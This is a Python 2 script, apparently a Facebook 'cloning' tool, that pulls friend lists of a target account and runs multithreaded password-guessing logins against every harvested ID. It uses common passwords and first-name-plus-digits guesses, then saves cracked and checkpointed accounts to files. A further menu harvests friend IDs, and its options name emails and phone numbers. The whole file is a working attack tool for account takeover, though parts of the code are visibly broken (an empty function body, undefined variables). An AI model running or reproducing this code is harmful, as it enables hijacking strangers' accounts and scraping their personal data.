#!/usr/bin/python
# coding=utf-8
# Originally Written By:Muhammad Hamza
# Source : Python2"
# Donot Recode It. 

#Import module
try:
    import os,sys,time,datetime,random,hashlib,re,threading,json,urllib,cookielib,getpass,mechanize,requests
    from multiprocessing.pool import ThreadPool
    from requests.exceptions import ConnectionError
    from mechanize import Browser
except ImportError:
    os.system('pip2 install requests')
    os.system('pip2 install mechanize')
    os.system("pip2 install lolcat")
    os.system('python2 jam.py')
os.system("clear")
#Browser Setting
bd=random.randint(2e7, 3e7)
sim=random.randint(2e4, 4e4)
header={'x-fb-connection-bandwidth': repr(bd),'x-fb-sim-hni': repr(sim),'x-fb-net-hni': repr(sim),'x-fb-connection-quality': 'EXCELLENT','x-fb-connection-type': 'cell.CTRadioAccessTechnologyHSDPA','user-agent':'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Kiwi Chrome/68.0.3438.0 Safari/537.36','content-type': 'application/x-www-form-urlencoded','x-fb-http-engine': 'Liger'}
reload(sys)
sys.setdefaultencoding("utf-8")
c = "\033[1;32m"
c2 = "\033[0;97m"
c3 = "\033[1;31m"
def exit():
	print "[!] Exit"
	os.sys.exit()


def acak(b):
    w = 'ahtdzjc'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)


def cetak(b):
    w = 'ahtdzjc'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'\033[%s;1m'%str(31+j))
    x += '\033[0m'
    x = x.replace('!0','\033[0m')
    sys.stdout.write(x+'\n')


def hamza(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
def hopss(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.1)
##### LOGO #####
def menu():
os.system('clear')
(' "\n    .S   .S_SSSs     .S_SsS_S.   \n   .SS  .SS~SSSSS   .SS~S*S~SS.  \n   S%S  S%S   SSSS  S%S  Y S%S  \n   S%S  S%S    S%S  S%S  •  S%S  \n   S&S  S%S•SSSS%S  S%S  •  S%S  \n   S&S  S&S  SSS%S  S&S  °  S&S  \n   S&S  S&S    S&S  S&S     S&S  \n   S&S  S&S    S&S  S&S     S&S  \n   d*S  S*S    S&S  S*S     S*S  \n  .S*S  S*S    S*S  S*S     S*S  \nsdSSS   S*S    S*S  S*S     S*S  \nYSSY    SSS    S*S  SSS     S*S  \n               SP           SP   \n               Y            Y    \n-----------------------------------------------\n➣ Author : Jam Shahrukh x Xtylo Ali Raza\n➣ Github : https://github.com/Blacklisted\n➣ Fb Page : https://m.facebook.com/Jam Shahrukh Official\n➣ Ref By : (Stylish Queen x Zahra Zohaib)-(Janzada Khan)\n-----------------------------------------------" ')
# titik #
def tik():
	titik = [".   ","..  ","... "]
	for o in titik:
		print("\r[✔] Logging In "+o),;sys.stdout.flush();time.sleep(1)

back = 0
threads = []
successful = []
checkpoint = []
oks = []
gagal = []
idh = []
id = []
emfromfriend = []
nofromfriend = []
			
#Menu
def menu():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		os.system('clear')
		print"[!] Token Not Found"
		os.system('rm -rf login.txt')
		os.system('python2 jam.py')
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		name = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"[!] Account Is On Checkpoint"
		os.system('rm -rf login.txt')
		time.sleep(1)
		os.system('python2 jam.py')
	except requests.exceptions.ConnectionError:
		print"[!] No Connection"
		time.sleep(1)
		os.system('python2 jam.py')
	os.system("clear")
	logo()
	print "|[✓] Name: "+name
	print "|[✓] ID  : "+id
	print (47*"-")
	print "[1] Start Cloning."
	print "[2] Clone With Pass Choice."
	print "[3] Grabbing Tools."
	print "[4] Auto Del Tools."
	print "[5] Update jam Tool."
	print "[6] Follow Me On Facebook."
	print "[7] Logout"
	print ('                  ')
	men()

def men():
	rana = raw_input("Choose Option >>  ")
	if rana =="":
		print " Wrong Input"
		men()
	elif rana =="1":
		crack()
	elif rana =="2":
	    os.system('clear')
	    hamza('[!] Please Wait While Page Is Loding.')
	    hopss('CKG-10%...')
	    hopss('CKG-20%...')
	    hopss('CKG-50%...')
	    hopss('CKG-70%...')
	    hopss('CKG-90%...')
	    hopss('CKG-95%...')
	    os.system('python2 .choice.py')
	    time.sleep(1)
	elif rana =="3":
		grab()
	elif rana =="4":
		bot()
	elif rana =="5":
		os.system('clear')
		logo()
		hamza('[✓] Please Wait While Tool Is Updating')
		os.system('git pull origin master')
		hamza('[✓] Tool Has Been Update Successfully')
		hamza('[✓] Please Wait While Update Is Setting Up On Your Mobile Phone')
		time.sleep(3)
		os.hamza('python2 jam.py')
	elif rana =="6":
		os.system('xdg-open https://www.facebook.com/jam.shahrukh124')
		menu()
	elif rana =="7":
		os.system('rm -rf login.txt')
		hamza('[✓] Logged Out Successfully')
		os.system('python2 jam.py')
	else:
		print "[!] Wrong Input"
		men()
	
##### INFO #####
def crack():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"Token invalid"
		os.system('rm -rf login.txt')
		time.sleep(1)
		os.system('python2 jam.py')
	os.system('clear')
	logo()
	print "[1] Clone From Friendlist."
	print "[2] Clone From Any Public ID."
	print "[3] Clone From File."
	print "[0] Back."
	crack_menu()

def crack_menu():
	crm = raw_input("Choose Option >>  ")
	if crm =="":
		print "[!] Filled Incorrectly"
		crack_menu()
	elif crm =="1":
		os.system('clear')
		logo()
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif crm =="2":
		os.system('clear')
		logo()
		idt = raw_input("[+] Input ID: ")
		
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			hamza('\033[1;97m[✓] Account Name \033[1;97m:\033[1;97m '+op['name'])
		except KeyError:
			print"[!] ID Not Found!"
			raw_input("\nPress Enter To Back  ")
			crack()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif crm =="3":
	    os.system('clear')
	    logo()
	    try:
	        idlist= raw_input('[+] File Name: ')
	        for line in open(idlist ,'r').readlines():
	            id.append(line.strip())
	    except IOError:
	         print"[!] File Not Found."
	         raw_input('Press Enter To Back. ')
	         crack()
	   
	        
	        
	elif crm =="0":
		menu()
	else:
		print "Filled Incorrectly"
		crack_menu()
	
        hamza('[✓] Total Friends: '+str(len(id)))
        time.sleep(0.5)
	hamza('[✓] The Process Has Been Started.')
	time.sleep(0.5)
        hamza('[!] To Stop Process Press CTRL Then Z')
        time.sleep(0.5)
        print (47*"-")
     
	
	
			
	def main(arg):
		global cpb,oks
		user = arg
		try:
		    os.mkdir('save')
		except OSError:
		    pass
		try:
			a = requests.get("https://graph.facebook.com/"+user+"/?access_token="+toket)
			b = json.loads(a.text)
			pass1='786786'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass1 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			q = json.load(data)
			if "access_token" in q:
				print '\x1b[1;96m[\x1b[1;96mSuccessful\x1b[1;96m]\x1b[1;96m ' + user + ' \x1b[1;96m|\x1b[1;96m ' + pass1
				oks.append(user+pass1)
			else:
				if "www.facebook.com" in q["error_msg"]:
					print '\x1b[1;91m[\x1b[1;91mCheckpoint\x1b[1;91m]\x1b[1;91m ' + user + ' \x1b[1;91m|\x1b[1;91m ' + pass1
					crt = open("save/checkpoint.txt", "a")
					crt.write(user+"|"+pass1+"\n")
					crt.close()
					checkpoint.append(user+pass1)
				else:
					pass2 = 'Pakistan'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass2 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					q = json.load(data)
					if "access_token" in q:
						print '\x1b[1;96m[\x1b[1;96mSuccessful\x1b[1;96m]\x1b[1;96m ' + user + ' \x1b[1;96m|\x1b[1;96m ' + pass2
						oks.append(user+pass2)
					else:
						if "www.facebook.com" in q["error_msg"]:
							print '\x1b[1;91m[\x1b[1;91mCheckpoint\x1b[1;91m]\x1b[1;91m ' + user + ' \x1b[1;91m|\x1b[1;91m ' + pass2
							crt = open("save/checkpoint.txt", "a")
							crt.write(user+"|"+pass2+"\n")
							crt.close()
							checkpoint.append(user+pass2)
						else:
							pass3 = '000786'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass3 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							q = json.load(data)
							if "access_token" in q:
								print '\x1b[1;96m[\x1b[1;96mSuccessful\x1b[1;96m]\x1b[1;96m ' + user + ' \x1b[1;96m|\x1b[1;96m ' + pass3
								oks.append(user+pass3)
							else:
								if "www.facebook.com" in q["error_msg"]:
									print '\x1b[1;91m[\x1b[1;91mCheckpoint\x1b[1;91m]\x1b[1;91m ' + user + ' \x1b[1;91m|\x1b[1;91m ' + pass3
									crt = open("save/checkpoint.txt", "a")
									crt.write(user+"|"+pass3+"\n")
									crt.close()
									checkpoint.append(user+pass3)
								else:
									pass4 = b['first_name'] + '123'
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass4 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									q = json.load(data)
									if "access_token" in q:
										print '\x1b[1;96m[\x1b[1;96mSuccessful\x1b[1;96m]\x1b[1;96m ' + user + ' \x1b[1;96m|\x1b[1;96m ' + pass4
										oks.append(user+pass4)
									else:
										if "www.facebook.com" in q["error_msg"]:
											print '\x1b[1;91m[\x1b[1;91mCheckpoint\x1b[1;91m]\x1b[1;91m ' + user + ' \x1b[1;91m|\x1b[1;91m ' + pass4
											crt = open("save/checkpoint.txt", "a")
											crt.write(user+"|"+pass4+"\n")
											crt.close()
											checkpoint.append(user+pass4)
										else:
											pass5 = b['first_name'] + '12345'
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass5 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											q = json.load(data)
											if "access_token" in q:
												print '\x1b[1;96m[\x1b[1;96mSuccessful\x1b[1;96m]\x1b[1;96m ' + user + ' \x1b[1;96m|\x1b[1;96m ' + pass5
												oks.append(user+pass5)
											else:
												if "www.facebook.com" in q["error_msg"]:
													print '\x1b[1;91m[\x1b[1;91mCheckpoint\x1b[1;91m]\x1b[1;91m ' + user + ' \x1b[1;91m|\x1b[1;91m ' + pass5
													crt = open("save/checkpoint.txt", "a")
													crt.write(user+"|"+pass5+"\n")
													crt.close()
													checkpoint.append(user+pass5)
												else:
													pass6 = b['first_name'] + '1122'
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass6 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													q = json.load(data)
													if "access_token" in q:
														print '\x1b[1;96m[\x1b[1;96mSuccessful\x1b[1;96m]\x1b[1;96m ' + user + ' \x1b[1;96m|\x1b[1;96m ' + pass6
														oks.append(user+pass6)
													else:
														if "www.facebook.com" in q["error_msg"]:
															print '\x1b[1;91m[\x1b[1;91mCheckpoint\x1b[1;91m]\x1b[1;91m ' + user + ' \x1b[1;91m|\x1b[1;91m ' + pass6
															crt = open("save/checkpoint.txt", "a")
															crt.write(user+"|"+pass6+"\n")
															crt.close()
															checkpoint.append(user+pass6)
														else:
															pass7 = b['first_name'] + '786'
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email=" + user + "&locale=en_US&password=" + pass7 + "&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															q = json.load(data)
															if "access_token" in q:
																print '\x1b[1;96m[\x1b[1;96mSuccessful\x1b[1;96m]\x1b[1;96m ' + user + ' \x1b[1;96m|\x1b[1;96m ' + pass7
																oks.append(user+pass7)
															else:
																if "www.facebook.com" in q["error_msg"]:
																	print '\x1b[1;91m[\x1b[1;91mCheckpoint\x1b[1;91m]\x1b[1;91m ' + user + ' \x1b[1;91m|\x1b[1;91m ' + pass7
																	crt = open("save/checkpoint.txt", "a")
																	crt.write(user+"|"+pass7+"\n")
																	crt.close()
																	checkpoint.append(user+pass7)           					
								                                       
				                                                                           
	
																	
															
		except:
			pass
		
	p = ThreadPool(30)
	p.map(main, id)
	print "\033[1;97m----------------------------------------------"
	hamza('[✓] Process Has Been Completed.')
	hamza('\033[1;97m[✓] Checkpoint IDS Has Been Saved.')
	xx = str(len(oks))
	xxx = str(len(checkpoint))
	print ("[✓] Total \033[1;32mOK/\033[1;97mCP : \033[1;32m"+str(len(oks))+"/\033[1;97m"+str(len(checkpoint)))
	print (47*"-")
	
	raw_input("\nPress Enter To Back ")
	menu()	
	

        
##### Grab #####
def grab():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"[!] Token Not Found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		os.system('python2 jam.py')
	os.system('clear')
	logo()
	print "[1] Extract Numeric IDs From Public ID."
	print "[2] Extract Email's From Public ID."
	print "[3] Extract Phone Number From Public ID."
	print "[0] Back."
	print('          ')
	grab_menu()
	
#Grab_input
def grab_menu():
	grm = raw_input("\nChoose Option >> ")
	if grm =="":
		print " Wrong Input"
		grab_menu()
	elif grm =="1":
		idfromfriend()
	elif grm =="2":
		emailfromfriend()
	elif grm =="3":
		numberfromfriend()
	elif grm =="0":
		menu()
	else:
		print "[!] Wrong input"
		grab_menu()
		


##### Extract IDs From Public Id #####
def idfromfriend():
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"[!] Token Not Found"
		os.system('rm -rf login.txt')
		time.sleep(1)
		('python2 jam.py')
	try:
		os.mkdir('save')
	except OSError:
		pass
	try:
		os.system('clear')
		logo()
		idt = raw_input("[+] Input ID : ")
		try:
			jok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			op = json.loads(jok.text)
			print"[✓] Account Name : "+op["name"]
		except KeyError:
			print"[!] Friend Not Found"
			raw_input("Press Enter To Back ")
			grab()
		r=requests.get("https://graph.facebook.com/"+idt+"?fields=friends.limit(5000)&access_token="+toket)
		z=json.loads(r.text)
		hamza('[✓] Getting Friends Numeric IDs...')
		print"--------------------------------------"
		bz = open('save/id.txt','w')
		for a in z['friends']['data']:
			idh.append(a['id'])
			bz.write(a['id'] + '\n')
			print ("\r["+str(len(idh))+" ] => "+a['id']),;sys.stdout.flush();time.sleep(0.001)
		bz.close()
		print '\r[✓] The Process Has Been Completed.'
		print"\r[✓] Total IDs Founded : "+str(len(idh))
		done = raw_input("\r[?] Save File With Name : ")
		print("\r[✓] The File Has Been Saved As save/"+done)
		raw_input("\nPress Enter To Back ")
		grab()
	except IOError:
		print"[!] Error While Creating file"
		raw_input("\nPress Enter To Back ")
		grab()
	except (KeyboardInterrupt,EOFError):
		print("[!]The Process Has Been Stopped")
		raw_input("\nPress Enter To Back ")
		grab()
	except KeyError:
		print('[!] Error')
		raw_input("\nPress Enter To Back ")
		grab()
	except requests.exceptions.ConnectionError:
		print"[✖] No Connection"
		time.sleep(1)
		grab()
	
if __name__ == '__main__':
	menu()
